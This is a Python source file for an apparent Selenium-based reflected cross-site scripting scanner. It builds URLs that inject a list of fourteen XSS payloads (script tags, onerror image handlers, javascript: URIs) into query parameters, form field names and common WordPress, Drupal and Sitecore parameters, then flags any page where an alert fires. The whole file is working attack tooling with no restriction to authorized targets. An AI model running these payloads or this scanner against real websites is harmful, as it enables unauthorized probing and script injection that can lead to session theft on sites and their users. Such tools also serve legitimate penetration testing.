from selenium.common.exceptions import UnexpectedAlertPresentException
from selenium.webdriver.common.by import By
import time

class XSSCommands:
    def __init__(self, webdriver, logger):
        self.version = 2.0
        self.driver = webdriver
        self.logger = logger
        
        
    def find_xss(self):
        print("finding xss...")
        current_url = self.driver.current_url
        suggestor = XSS_Url_Suggestor(current_url, self.driver)
        urls_to_try = suggestor.get_xss_urls()
        print("url is %s"%current_url)
        print('')
        for x in urls_to_try:
            try:
                self.driver.get(x)
                time.sleep(2)
                self.driver.get(current_url)
            except UnexpectedAlertPresentException:
                print("XSS - "+x)
                pass
            except:
                print("Some error happened finding xss!")
                pass
        print('')
        print('')
        input("Press ENTER to return to menu.")
        


class XSS_Url_Suggestor:
    xss_attacks = ['<script>alert(1)</script>',
                   '</script><script>alert(1)</script>',
                   '<img src=x onerror="alert(1)" />',
                   "'/><img src=x onerror='alert(1)' />",
                   '"/><img src=x onerror="alert(1)" />',
                   ';alert(1);',
                   '";alert(1);',
                   "';alert(1);",
                   '--><script>alert(1)</script>',
                   '</title><script>alert(1)</script>',
                   '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
                   '<TD BACKGROUND="javascript:alert(\'XSS\')">',
                   '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
                   '<BGSOUND SRC="javascript:alert(\'XSS\');">']

    # Common parameter names found across many web applications.  The list has
    # been extended with parameters typically used by popular CMS platforms
    # such as WordPress, Drupal and Sitecore to improve XSS payload coverage.
    common_param_names = [
        # Generic parameters
        'search', 'query', 'id', 'page', 'q',
        # WordPress specific
        's', 'cat', 'tag', 'author', 'p', 'page_id', 'name',
        # Drupal specific
        'nid', 'node', 'type', 'search_api_fulltext',
        # Sitecore specific
        'sc_mode', 'sc_lang', 'sc_itemid', 'sc_site', 'sc_template',
        'sc_version'
    ]

    def __init__(self, url, driver=None):
        self.version = 2.0
        self.url = url
        self.driver = driver

    def _existing_params(self):
        params = {}
        urlsplitloc = self.url.find("?")
        if urlsplitloc >= 0:
            paramstring = self.url[urlsplitloc+1:]
            if paramstring:
                pairs = paramstring.split('&')
                for single in pairs:
                    if '=' in single:
                        key, value = single.split('=', 1)
                    else:
                        key, value = single, ''
                    params[key] = value
        return params

    def _form_field_names(self):
        names = set()
        if not self.driver:
            return names
        try:
            elements = self.driver.find_elements(By.XPATH, "//form//input[@name] | //form//textarea[@name] | //form//select[@name]")
            for element in elements:
                name = element.get_attribute("name")
                if name:
                    names.add(name)
        except Exception:
            pass
        return names

    def get_xss_urls(self):
        rtnData = []

        existing_params = self._existing_params()
        param_names = set(existing_params.keys())
        param_names.update(self._form_field_names())
        param_names.update(self.common_param_names)

        base_url = self.url.split("?")[0]
        base_query = "&".join(f"{k}={v}" for k, v in existing_params.items())

        for name in param_names:
            for payload in self.xss_attacks:
                if name in existing_params:
                    replaced = existing_params.copy()
                    replaced[name] = payload
                    query = "&".join(f"{k}={v}" for k, v in replaced.items())
                else:
                    if base_query:
                        query = base_query + f"&{name}={payload}"
                    else:
                        query = f"{name}={payload}"
                rtnData.append(base_url + "?" + query)

        return rtnData
        
        
